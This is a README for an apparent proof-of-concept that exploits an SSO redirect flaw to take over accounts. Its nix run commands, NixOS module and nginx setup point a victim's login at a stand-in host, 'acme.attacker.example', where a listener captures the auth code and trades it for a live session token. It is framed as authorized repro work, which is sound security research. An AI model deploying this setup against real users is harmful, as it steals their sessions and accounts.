# ssologin redirect demo (listener + nginx)

Runs the ssologin redirect demo on a Nix host behind nginx. The listener binds
loopback; nginx terminates TLS and forwards the ACS redirect to it. When the
victim finishes the IdP login, the listener captures the `auth_code`, redeems it
at STS and fetches `/auth/v1/session` with the resulting token.

Authorized testing only. Use a test team and a test account you own. The
captured session belongs to whoever completes the login.

The listener serves two routes:

- `/login/select-provider?team_url=<team>&login_flow_id=<id>` (or `/sso`):
  mints a real IdP login link server-side and 302s to it. This is the link to
  hand out — an SSO entry URL, not the long SAML assertion URL. With no
  `origin` parameter it uses the request host as `Origin` (team slug is the
  first label), so the ACS comes back to the listener. Passing
  `origin=https://<team>.app.<env>` flips it to the legitimate-Origin +
  `redirectUrl` shape (used by the local orchestrator).
- `/login/sso?auth_code=…`: the ACS callback; redeems the code and serves the
  capture page.

The real dashboard URL (`https://<team>.app.<env>/login/select-provider`) is not
usable for the capture: the v2 auth frontend only adds `redirectUrl` to the
`/v2/saml/ssologin` request on localhost (`login-api.service.ts`), so a
dashboard-initiated login always returns to the dashboard.

## What is here

| File | Purpose |
|---|---|
| `demo-ssologin-takeover.sh` | Orchestrates: starts the listener, requests the login link, waits, prints the obtained session. |
| `ssologin-listener.py` | Loopback HTTP listener; redeems the auth code at STS and writes `capture.json`. |
| `flake.nix`, `package.nix` | `nix run` apps and packages. |
| `module.nix` | NixOS module: systemd service + nginx virtual host. |
| `nginx.conf.example` | Standalone nginx server block for non-NixOS hosts. |

## Quick start (any machine with Nix)

```bash
cd .claude/demo

# f2: legitimate Origin + attacker redirectUrl
nix run . -- \
  --team acme \
  --api https://api.eu2.coralogix.com \
  --target https://acme.attacker.example \
  --port 8776 \
  --timeout 300
```

Requirements on the box:

- `acme.attacker.example` resolves to this host and the browser can reach it.
- nginx forwards `https://acme.attacker.example/*` to `127.0.0.1:8776`
  (`nginx.conf.example`).
- The host can reach `https://api.eu2.coralogix.com` outbound (the STS exchange).

The script prints the IdP login link. Open it as the victim (or send it to
them). After the ACS redirect, it prints the victim's username, user id and the
session token, saved to `session.jwt` (mode 600) under a temp directory.

For the f1 shape (forged Origin, no query parameter):

```bash
nix run . -- --mode f1 --team acme --target https://acme.attacker.example
```

f1 requires the host's first label to be the team slug (that is how the service
resolves the team), so the public name must look like `acme.<your-domain>` and
must resolve to the same listener.

## NixOS module

Add the flake as an input, then:

```nix
{
  inputs.ssologin-demo.url = "path:/path/to/sso-service/.claude/demo"; # or git+file:...

  # in the host configuration
  imports = [ inputs.ssologin-demo.nixosModules.default ];

  services.ssologinDemo = {
    enable = true;
    sts = "https://api.eu2.coralogix.com";
    port = 8776;

    nginx = {
      enable = true;
      hostName = "acme.attacker.example";
      enableACME = true;   # needs DNS + ports 80/443 reachable
      forceSSL = true;
    };
  };
}
```

This gives you:

- `ssologin-demo.service` running the listener as the `ssologin-demo` user,
  writing `/var/lib/ssologin-demo/capture.json` (0700 dir, 0600 file).
- An nginx virtual host for `hostName`, proxying to `127.0.0.1:8776` with
  `access_log off` (the query string carries the auth code).
- Firewall ports opened to match `forceSSL`.

Read the result as root:

```bash
sudo jq '{exchange_http_status, session}' /var/lib/ssologin-demo/capture.json
```

In service mode the listener is always up, so you do not need the orchestration
script: request a login link with the existing repro, open it, and the listener
exchanges the code by itself. The orchestrator is for the localhost/quick demo
where it starts and stops the listener for you.

If nginx runs in a container or another namespace, set
`services.ssologinDemo.allowNonLoopback = true` and `bindAddress` accordingly.
That removes the loopback guard: anyone who can reach the listener can hand it
an auth code.

### Local TLS without a public domain

For a laptop demo you can use a name in `/etc/hosts` (for example
`acme.attacker.test` → `127.0.0.1`) and a self-signed certificate instead of
ACME:

```nix
services.ssologinDemo.nginx = {
  hostName = "acme.attacker.test";
  forceSSL = true;
  enableACME = false;
};

services.nginx.virtualHosts."acme.attacker.test" = {
  sslCertificate = "/etc/ssl/private/attacker.test.fullchain.pem";
  sslCertificateKey = "/etc/ssl/private/attacker.test.key";
};
```

The first label still has to be the team slug for the f1 shape.

## Non-NixOS nginx

```bash
cd .claude/demo
nix run .#listener -- serve --sts https://api.eu2.coralogix.com \
  --out /tmp/ssologin-capture.json
```

Then use `nginx.conf.example` in your nginx config and reload it.

## Notes

- The listener is deliberately loopback-only by default; it refuses other
  binds unless `--allow-non-loopback` is passed.
- `capture.json` contains a live session token. Treat it as a credential and
  delete it when the demo is over.
- Flakes only see git-tracked files. If `nix` reports a missing file, stage the
  directory first (`git add .claude/demo`).
- The auth code is single-use and short-lived; a second exchange at STS fails
  and is reported as such.
